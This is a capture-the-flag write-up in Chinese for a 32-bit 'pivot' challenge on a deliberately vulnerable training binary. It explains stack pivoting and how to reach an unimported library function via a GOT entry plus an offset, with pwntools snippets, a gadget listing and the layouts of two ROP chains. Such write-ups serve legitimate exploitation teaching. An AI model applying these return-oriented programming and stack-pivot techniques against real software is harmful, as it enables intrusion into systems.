Hint1:
> There's only enough space for a three-link chain on the stack but you've been given space to
stash a much larger ROP chain elsewhere. Learn how to pivot the stack onto a new location.

Hint2:
> The ret2win() function in the libpivot.so shared object isn't imported, but that doesn't mean
you can't call it using ROP! You'll need to find the .got.plt entry of foothold_function() and
add the offset of ret2win() to it to resolve its actual address. Notice that foothold_function()
isn't called during normal program flow, you'll have to call it first to populate the .got.plt entry.

<br>

## Stack Pivot
简单来说就是：改变 esp 的值，让它指向另一处的内存。

如果某处内存不够放完整的 ROP Chain，我们可以把完整的 ROP Chain 分成数段，分别摆在内存不同处，然后通过改变 esp 逐段执行。

<br>

## Calling Unimported Functions in Shared Library (.so)
这道题我们需要呼叫 ret2win() 来打印 flag，但 ret2win() 在程式中完全没被呼叫，那么我们怎么知道它是真实位址呢？

我们可以用 pwntools 计算出 ret2win() 和 foothold_function() 的偏移量：
```
from pwn import *

lib = ELF('libpivot32.so')
offset = lib.symbols['ret2win'] - lib.symbols['foothold_function']
```

然后我们先呼叫 `foothold_function@plt`，让其真实位址被填入 GOT 内。

接着取得 foothold_function() 在 GOT 中所对应 entry 的位址（注意：是 entry 的位址，不是 foothold_function 本身）
```
elf = ELF('pivot32')
foothold_function_got = elf.got['foothold_function']
```

也就是说，foothold_function_got 指向的内存空间中，存的就是 foothold_function() 的真实位址。

有了 foothold_function() 的真实位址，我们只要再加上刚刚算的 offset，就会得到 ret2win() 的真实位址了。
```
ret2win 真实位址 = [foothold_function_got] + offset
```

<br>

## Reverse
这题在 pwnme() 里面调用两次 fgets()：
1. 第一次，会写入 heap 某处（题目在一开始就先用 malloc() 获得了 heap 上 100 bytes 的空间，后面才呼叫 fgets()）
2. 第二次，会写入 stack（但最多只让使用者写0x3a bytes）

所以我们要做什么呢？
1. 第一次，题目要我们输入我们真正的 ROP Chain
2. 第二次，题目要我们进行 stack pivot

我們只要先 stack pivot，然後想辦法執行到 ret2win() 這個函數就可以了。

<br>

## ROP Gadgets
先看看题目给了哪些 gadgets：
```
pwndbg> disas usefulGadgets
Dump of assembler code for function usefulGadgets:
   0x080488c0 <+0>:     pop    eax                  <--- gadget1
   0x080488c1 <+1>:     ret
   0x080488c2 <+2>:     xchg   esp,eax              <--- gadget2
   0x080488c3 <+3>:     ret
   0x080488c4 <+4>:     mov    eax,DWORD PTR [eax]  <--- gadget4
   0x080488c6 <+6>:     ret
   0x080488c7 <+7>:     add    eax,ebx              <--- gadget3
   0x080488c9 <+9>:     ret
（省略若干行）
```

用 `ROPGadget --binary pivot32` 可以再找到兩个有用的 gadgets：
```
0x08048571 : pop ebx ; ret   <--- gadget5
0x080486a3 : call eax        <--- gadget6
```

<br>

## Pwn
有了以上六个 gadgets，我们可以设计 ROP Chain 了。

下面这段输入到第一次 fgets() 里：
```
ret: foothold_function@plt +
ret: gadget1 +
eax: foothold_function@got.plt +
ret: gadget4 +   ---> eax = foothold_function() 的真实位址
ret: gadget5 +
ebx: offset +    ---> 0x1f7
ret: gadget3 +   ---> add eax, ebx 之后，eax = ret2win() 的真实位址
ret: gadget6     ---> call eax
```

下面这段输入到第二次 fgets() 里：
```
padding: 11 * 'AAAA' +
ret: gadget1 +
eax: pivot_dest +
ret: gadget2
```
